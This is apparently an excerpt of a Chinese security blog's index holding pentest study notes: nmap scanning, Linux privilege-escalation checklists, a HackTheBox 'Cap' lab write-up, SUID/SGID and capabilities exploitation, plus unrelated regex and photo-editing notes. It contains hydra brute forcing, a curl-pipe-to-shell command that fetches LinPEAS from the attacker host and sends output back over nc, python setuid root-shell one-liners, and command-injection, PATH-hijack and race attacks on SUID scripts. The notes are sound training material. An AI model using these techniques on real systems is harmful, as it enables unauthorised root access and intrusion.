打印说明</span></span><span class="line">nmap --script-help <span class="hljs-string">&quot;(default or version) and *#&#123;module&#125;*&quot;</span></span></code></pre></div></div><h4 id="使用漏洞扫描"><a href="#使用漏洞扫描" class="headerlink" title="使用漏洞扫描"></a>使用漏洞扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -sV -O -p --script vuln <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 侦察清单</title>
      <link href="/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h2 id="在确定系统后的初步侦察清单"><a href="#在确定系统后的初步侦察清单" class="headerlink" title="在确定系统后的初步侦察清单"></a>在确定系统后的初步侦察清单</h2><p>检查开放端口，系统版本，服务版本，漏洞信息</p><p><a href="/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/" title="nmap 使用">nmap 使用</a></p><ul><li><input disabled="" type="checkbox"> 端口的初步扫描</li><li><input disabled="" type="checkbox"> 端口的全面扫描</li><li><input disabled="" type="checkbox"> 带漏扫脚本的端口定向扫描</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 侦察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 可执行文件的漏洞利用</title>
      <link href="/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>当可执行文件被配置为SUID或者放在SUDO中的时候，这就意味着文件可以以高权限运行，那么只要找出漏洞就可以提权。</p><p><a href="/2021/07/21/SUID-SGID/" title="Linux SUID &amp; SGID">Linux SUID &amp; SGID</a></p><ul><li><input disabled="" type="checkbox"> 脚本用的是csh?</li><li><input disabled="" type="checkbox"> 引用的文件没有使用绝对路径？</li><li><input disabled="" type="checkbox"> 脚本的适用范围是否过大？</li><li><input disabled="" type="checkbox"> 使用了临时文件？</li><li><input disabled="" type="checkbox"> 参数是否过滤，能否用分号做更多的事</li><li><input disabled="" type="checkbox"> 是否设置了IFS</li><li><input disabled="" type="checkbox"> 脚本本身的风险</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 提权清单</title>
      <link href="/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>本篇为总结Linux的提权方法，并做成清单列表已供查询提示。</p><p>大部分清单内容已经在<code>LinPEAS</code>中包含了，如何使用请查看<a href="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/" title="linpeas 使用">linpeas 使用</a></p><h2 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h2><ul><li><input disabled="" type="checkbox"> 系统信息</li></ul><h2 id="权限检查"><a href="#权限检查" class="headerlink" title="权限检查"></a>权限检查</h2><ul><li><input disabled="" type="checkbox"> <code>sudo -l</code></li><li><input disabled="" type="checkbox"> <code>suid</code> 和 <code>sgid</code> (<a href="/2021/07/21/SUID-SGID/" title="查看">查看</a>)</li><li><input disabled="" type="checkbox"> <a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a></li><li><input disabled="" type="checkbox"> <a href="/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/" title="可执行文件的漏洞">可执行文件的漏洞</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB cap</title>
      <link href="/2021/07/22/HTB-cap/"/>
      <url>/2021/07/22/HTB-cap/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">IP</th><th align="center">ROLE</th><th align="center">OS</th></tr></thead><tbody><tr><td align="center">10.10.10.245</td><td align="center">Victim</td><td align="center">Linux</td></tr><tr><td align="center">10.10.14.228</td><td align="center">Attacker</td><td align="center">Kali</td></tr></tbody></table><blockquote><p>如果你是在找writeup而看的这篇文章，那么请再坚持一下。这里给一点提示:</p><ol><li>仔细观察表面内容，这题并没有需要深挖的内容，别想多</li><li>root的方法题目已经给出来了</li></ol></blockquote><h2 id="获取普通权限"><a href="#获取普通权限" class="headerlink" title="获取普通权限"></a>获取普通权限</h2><p>通过nmap检查端口，发现有<code>21 22 80</code>端口打开，再没有其他端口。</p><p>第一反应是ftp的匿名用户或者常用用户。尝试爆破，这里推荐<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">这个字典</a></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">hydra -C password.txt -u -e s 10.10.10.245 ftp</span></code></pre></div></div><p>ftp这里其实是个幌子，使用常用密码爆破没有作用。</p><p>然后打开80网页，通过观察，发现<code>10.10.10.245/data/3</code>这个页面是的数字是变动的，更改为<code>0</code>后获取pcap文件。</p><p>用<code>Wireshark</code>打开后过观察报文发现有FTP报文，追踪TCP流的到FTP用户密码</p><p><img src="/2021/07/22/HTB-cap/1.png"></p><p>ssh 登录</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-nginx codeBlockLines"><span class="line"><span class="hljs-attribute">ssh</span> nathan@<span class="hljs-number">10.10.10.245</span></span></code></pre></div></div><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权起手式</p><ul><li>查看<code>sudo -l</code> </li><li>利用<code>LinPEAS</code>搜索</li></ul><p>当查看<code>sudo -l</code>的时候，此用户没有任何内容</p><h3 id="使用-LinPEAS"><a href="#使用-LinPEAS" class="headerlink" title="使用 LinPEAS"></a>使用 <code>LinPEAS</code></h3><p>使用不写入硬盘的方式利用<code>LinPEAS</code>，这里用到<a href="https://github.com/Elinpf/cmder">cmder</a>工具提示命令。</p><p>下载LinPEAS</p><p><img src="/2021/07/22/HTB-cap/2.png"></p><p>监听端口并发送LinPEAS</p><p><img src="/2021/07/22/HTB-cap/3.png"></p><p><img src="/2021/07/22/HTB-cap/4.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python3 -m http.server 5711 &amp;</span><span class="line">nc -lvnp 1633 | tee linpeas.out</span></code></pre></div></div><p>用cmder得到命令后，到目标机上执行</p><p><img src="/2021/07/22/HTB-cap/5.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">curl 10.10.14.228:5711/linpeas.sh | sh | nc 10.10.14.228 1633</span></code></pre></div></div><p>这样就可以不留痕迹的得到输出文件了</p><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p>观察输出文件发现</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">╔══════════╣ Capabilities</span><span class="line">╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities</span><span class="line">Current capabilities:</span><span class="line">Current: =</span><span class="line">CapInh: 0000000000000000</span><span class="line">CapPrm: 0000000000000000</span><span class="line">CapEff: 0000000000000000</span><span class="line">CapBnd: 0000003fffffffff</span><span class="line">CapAmb: 0000000000000000</span><span class="line"></br></span><span class="line">Shell capabilities:</span><span class="line">0x0000000000000000=</span><span class="line">CapInh: 0000000000000000</span><span class="line">CapPrm: 0000000000000000</span><span class="line">CapEff: 0000000000000000</span><span class="line">CapBnd: 0000003fffffffff</span><span class="line">CapAmb: 0000000000000000</span><span class="line"></br></span><span class="line">Files with capabilities (limited to 50):</span><span class="line marked">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span><span class="line">/usr/bin/ping = cap_net_raw+ep</span><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span></code></pre></div></div><p>了解到<code>python3.8</code>拥有<code>cap_setuid</code>的能力。 关于Capabilities请查看<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a></p><p><code>cap_setuid</code>可以设置有效用户，能够提权。</p><p>因为是python，所以利用方法为</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">/usr/bin/python3.8 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span></code></pre></div></div><p>得到root权限</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本题简单，但是也有知识点，需要对<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a>有所了解。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux SUID &amp; SGID</title>
      <link href="/2021/07/21/SUID-SGID/"/>
      <url>/2021/07/21/SUID-SGID/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>SUID 就是 Set User id， SGID 就是 Set Group id</p><h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nathan@<span class="hljs-built_in">cap</span>:~<span class="hljs-comment"># ls -la /usr/bin/passwd</span></span><span class="line">-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd</span></code></pre></div></div><p>可以看到<code>s</code>这个标签在原本的<code>x</code>标签上，特点如下：</p><ol><li>SUID权限仅对可执行文件有效</li><li>如果执行者对这个文件有执行权限，那么将以文件的所有者权限执行</li><li>本权限仅在运行的过程中有效</li></ol><p>那么现在再看下passwd的执行过程。因为nathan拥有可执行权限，而passwd在所有者的权限是<code>wrs</code>，所以当nathan用户运行的时候是以root的权限执行的，进行修改了<code>/etc/shadow</code>。</p><p>修改成SUID的命令为</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">chmod 4755 /usr/bin/cat</span><span class="line">chmod u+s /usr/bin/cat</span></code></pre></div></div><h3 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h3><p>对于可执行文件特点与SUID一样，只不过是以组的权限运行的。</p><p>对于文件夹来说，如果这个文件夹的所有组被标记了<code>s</code>，特点如下：</p><ol><li>对这个文件夹拥有<code>r</code>和<code>x</code>的用户，可以进入文件夹</li><li>进入文件夹后，用户的操作为文件夹用户组的操作权限</li><li>如果用户拥有<code>w</code>的权限，那么用户创建文件的用户组就是这个文件夹组的用户组</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">chmod 2755 file_dir</span><span class="line">chmod g+s file_dir</span></code></pre></div></div><h3 id="rwS"><a href="#rwS" class="headerlink" title="rwS"></a>rwS</h3><p>有的文件是<code>S</code>为标记，说明没有执行权限。因为与<code>x</code>重合了所有做了区分</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>suid 的利用方式常常是因为配置的可执行文件能够得到<code>shell</code>或者可以访问敏感信息。</p><p>例如，如果<code>cat</code>有了suid的权限，那么就可以访问<code>cat /etc/shadow</code>。</p><p>或者<code>python</code>有了suid，那么就可以以root权限执行<code>/bin/bash</code>从而得到root的shell</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span></code></pre></div></div><h3 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">find / -perm -4000 2&gt;/dev/null  <span class="hljs-comment"># 查看所有suid的二进制文件</span></span><span class="line">find / -perm -2000 2&gt;/dev/null  <span class="hljs-comment"># 查看所有sgid的二进制文件和文件夹</span></span></code></pre></div></div><h3 id="7种利用方法"><a href="#7种利用方法" class="headerlink" title="7种利用方法"></a>7种利用方法</h3><p>方法参考了<a href="http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf">这篇文章</a></p><h4 id="用的是csh"><a href="#用的是csh" class="headerlink" title="用的是csh?"></a>用的是csh?</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% ls change-pass</span><span class="line">-rwsr-x--- 1 root helpdesk</span><span class="line"> 37 Feb 26 16:35 change-pass</span><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/csh -b</span></span><span class="line"><span class="hljs-built_in">set</span> user = <span class="hljs-variable">$1</span></span><span class="line">passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% env TERM=<span class="hljs-string">&#x27;`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`&#x27;</span> change-pass</span></code></pre></div></div><h4 id="引用的文件没有使用绝对路径？"><a href="#引用的文件没有使用绝对路径？" class="headerlink" title="引用的文件没有使用绝对路径？"></a>引用的文件没有使用绝对路径？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% <span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&#x27;/tmp&#x27;</span></span><span class="line">% <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh&quot;</span> &gt;/tmp/passwd</span><span class="line">% ./change-pass</span></code></pre></div></div><h4 id="脚本的适用范围是否过大？"><a href="#脚本的适用范围是否过大？" class="headerlink" title="脚本的适用范围是否过大？"></a>脚本的适用范围是否过大？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>可以修改root的密码</p><h4 id="使用了临时文件？"><a href="#使用了临时文件？" class="headerlink" title="使用了临时文件？"></a>使用了临时文件？</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">[ -z <span class="hljs-variable">$user</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">rm /tmp/.user</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span> &gt; /tmp/.user</span><span class="line">isroot=<span class="hljs-string">&#x27;/usr/bin/grep -c root /tmp/.user&#x27;</span></span><span class="line">[ <span class="hljs-string">&quot;<span class="hljs-variable">$isroot</span>&quot;</span> -gt 0 ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;You Can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>看到上面使用了临时文件，那么就意味着可以打时间差，通过疯狂循，用空覆盖掉写入的内容。<br>那么就跳过了检查是否为空，就可以修改root密码了。</p><h4 id="参数是否过滤，能否用分号做更多的事"><a href="#参数是否过滤，能否用分号做更多的事" class="headerlink" title="参数是否过滤，能否用分号做更多的事"></a>参数是否过滤，能否用分号做更多的事</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">[ -z <span class="hljs-variable">$user</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">[ <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span> = root ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>可以看到值判断是否有<code>$user</code>和<code>$user</code>是否为root。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">change-pass <span class="hljs-string">&quot;user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span></span></code></pre></div></div><h4 id="是否设置了IFS"><a href="#是否设置了IFS" class="headerlink" title="是否设置了IFS"></a>是否设置了IFS</h4><p><strong>IFS(Internal Field Separator)</strong>, 内部域分割符，set环境变量。</p><p>案例中给出了使用方法</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">export IFS=&#x27;/&#x27;</span></code></pre></div></div><p>这样<code>/usr/bin/passwd</code> 就变成了 <code>usr bin passwd</code>，然后替换<code>usr</code>的执行就可以了，但是没有实验成功。</p><h4 id="脚本本身的风险"><a href="#脚本本身的风险" class="headerlink" title="脚本本身的风险"></a>脚本本身的风险</h4><p>脚本要运行会有两个步骤：</p><ol><li>启动一个shell</li><li>这个shell读取脚本的内容然后执行</li></ol><p>那么就会有一个时间差</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-built_in">cd</span> /tmp</span><span class="line">ln -s change-pass rootme</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">$ ./rootme &amp;</span><span class="line">$ rm rootme &amp;&amp; \</span><span class="line"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span> \</span><span class="line"> &gt;&gt; rootme</span></code></pre></div></div><p>这个会有很大的几率读取不到完整的内容而失败，但是可以用自动化的方式实现。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Capabilities</title>
      <link href="/2021/07/21/linux-capabilities/"/>
      <url>/2021/07/21/linux-capabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Capabilities"><a href="#什么是Capabilities" class="headerlink" title="什么是Capabilities"></a>什么是Capabilities</h2><p>Capabilites是从内核2.5之后引入的，作用于<strong>进程</strong>或者<strong>线程</strong>上，是将权限更加细致的划分，保障系统安全的一种能力。<br>类似于windows的特权。</p><h3 id="capabilities-set"><a href="#capabilities-set" class="headerlink" title="capabilities set"></a>capabilities set</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-avrasm codeBlockLines"><span class="line">root@iZbp19p0eesh0lxr45we33Z:~<span class="hljs-meta"># cat /proc/$$/status | grep Cap</span></span><span class="line"><span class="hljs-symbol">CapInh:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># 可以继承的CAP(i)</span></span><span class="line"><span class="hljs-symbol">CapPrm:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 可以使用的CAP(p)</span></span><span class="line"><span class="hljs-symbol">CapEff:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 使用的CAP(e)</span></span><span class="line"><span class="hljs-symbol">CapBnd:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># 可以被禁止的</span></span><span class="line"><span class="hljs-symbol">CapAmb:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># </span></span></code></pre></div></div><h3 id="进程CAP"><a href="#进程CAP" class="headerlink" title="进程CAP"></a>进程CAP</h3><ul><li>查看进程CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1234</span>/status | grep Cap  <span class="hljs-comment"># 查看1234进程的能力</span></span><span class="line">cat <span class="hljs-regexp">/proc/</span>$$/status | grep Cap <span class="hljs-comment"># 查看现在进程的能力</span></span></code></pre></div></div><ul><li>解码CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line">capsh <span class="hljs-attribute">--decode</span>=0000000000003000</span><span class="line"><span class="hljs-attribute">0x0000000000003000</span>=cap_net_admin,cap_net_raw</span></code></pre></div></div><h3 id="二进制文件CAP"><a href="#二进制文件CAP" class="headerlink" title="二进制文件CAP"></a>二进制文件CAP</h3><ul><li>查看二进制文件CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">getcap <span class="hljs-regexp">/usr/</span>bin/ping</span><span class="line">getcap `whereis python3`</span></code></pre></div></div><ul><li>搜索所有二进制文件的CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-1c codeBlockLines"><span class="line">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-literal">null</span></span></code></pre></div></div><p>在<code>LinPEAS</code>中有自动检查</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>根据不同的CAP找出对应的提权方法，详细方法在<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#malicious-use">这里查看</a></p><table><thead><tr><th align="center">CAP</th><th align="center">描述</th><th align="center">能否提权</th></tr></thead><tbody><tr><td align="center">CAP_SYS_ADMIN</td><td align="center">可以挂在文件系统</td><td align="center">√</td></tr><tr><td align="center">CAP_SYS_PTRACE</td><td align="center">可以shellcode注入并逃离容器</td><td align="center">√</td></tr><tr><td align="center">CAP_SYS_MODULE</td><td align="center">可以增加或者移除核心模块</td><td align="center">√</td></tr><tr><td align="center">CAP_DAC_READ_SEARCH</td><td align="center">可以绕过查看文件和执行文件的检查</td><td align="center">√</td></tr><tr><td align="center">CAP_DAC_OVERRIDE</td><td align="center">写任意文件</td><td align="center">√</td></tr><tr><td align="center">CAP_CHOWN</td><td align="center">更改任意文件的所有者</td><td align="center">√</td></tr><tr><td align="center">CAP_FORMER</td><td align="center">更改任意文件的权限</td><td align="center">√</td></tr><tr><td align="center">CAP_SETUID</td><td align="center">设置有效用户</td><td align="center">√</td></tr><tr><td align="center">CAP_SETGID</td><td align="center">设置有效组</td><td align="center">√</td></tr><tr><td align="center">CAP_SETFCAP</td><td align="center">可以设置文件或者进程的CAP</td><td align="center">√</td></tr><tr><td align="center">CAP_KILL</td><td align="center">可以杀死任何进程</td><td align="center">×</td></tr><tr><td align="center">CAP_NET_BIND_SERVICE</td><td align="center">可以监听任何端口</td><td align="center">×</td></tr><tr><td align="center">CAP_NET_RAW</td><td align="center">可以嗅探接口</td><td align="center">×</td></tr><tr><td align="center">CAP_NET_ADMIN + CAP_NET_RAW</td><td align="center">可以修改防护墙规则</td><td align="center">×</td></tr><tr><td align="center">CAP_LINUX_IMMUTABLE</td><td align="center">修改inode属性</td><td align="center">×</td></tr></tbody></table><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="python-拥有-CAP-SETUID"><a href="#python-拥有-CAP-SETUID" class="headerlink" title="python 拥有 CAP_SETUID"></a>python 拥有 CAP_SETUID</h3><p><img src="/2021/07/21/linux-capabilities/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2021/07/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2021/07/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://wangwl.net/static/projects/visualRegex">一个可视化的正则表达式在线测试网站</a></li></ul><h2 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h2><ul><li>匹配每个值</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">^(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))$</span></code></pre></div></div><ul><li>只做验证判断</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">^(?:(?:\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.)&#123;3&#125;(?:\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))$</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PS后期方面</title>
      <link href="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/"/>
      <url>/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://www.bilibili.com/video/BV1ca4y1s7gY">参考视频</a></li></ul><h1 id="通透"><a href="#通透" class="headerlink" title="通透"></a>通透</h1><h2 id="原色原理"><a href="#原色原理" class="headerlink" title="原色原理"></a>原色原理</h2><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/1.png"></p><p>滤色模式就是加色模式，就是光的三原色的加色</p><p>RGB与CMY有着非常紧密的联系</p><table><thead><tr><th align="center">原色</th><th align="center">支持色</th><th align="center">互补色</th></tr></thead><tbody><tr><td align="center">红</td><td align="center">黄，品红</td><td align="center">青</td></tr><tr><td align="center">绿</td><td align="center">黄，青</td><td align="center">品红</td></tr><tr><td align="center">蓝</td><td align="center">青，品红</td><td align="center">黄</td></tr></tbody></table><p>去除互补色干扰</p><h2 id="什么是色彩脏？"><a href="#什么是色彩脏？" class="headerlink" title="什么是色彩脏？"></a>什么是色彩脏？</h2><p>色彩脏是因为加入了互补色</p><p>比如蓝色与黄色为互补色，那么调低不透明度就会成为灰色</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/2.png"></p><h1 id="影调"><a href="#影调" class="headerlink" title="影调"></a>影调</h1><h2 id="影调的划分系统"><a href="#影调的划分系统" class="headerlink" 